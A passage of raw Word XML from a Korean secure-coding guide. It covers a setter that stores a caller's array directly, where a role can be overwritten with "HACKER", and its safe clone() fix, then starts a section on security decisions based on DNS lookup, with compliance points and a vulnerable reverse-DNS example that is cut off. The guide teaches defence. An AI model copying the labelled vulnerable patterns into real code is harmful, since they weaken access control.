            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>내부도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>변경됨</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">setAllowedRoles(roles) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>호출</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> roles[0] = "HACKER" </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>원본</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배열을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수정하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> allowedRoles</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동시에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변경됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기준</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>목록이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>런타임에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변조되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제어가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>완전히</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무력화됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>복사본을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>private String[] allowedRoles;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public void setAllowedRoles(String[] roles) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    allowedRoles = roles.clone();  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>복사본</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>제</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>절</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">  API </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>오용</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  1. DNS lookup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의존한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안결정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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>보안결정에서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도메인명을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이용한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DNS lookup</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을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사용하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>• DNS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>는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스푸핑될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수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있으므로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> IP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주소를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직접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검증하거나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다른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인증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수단을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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] DNS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역조회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결과로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>보안</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (DNS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스푸핑에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
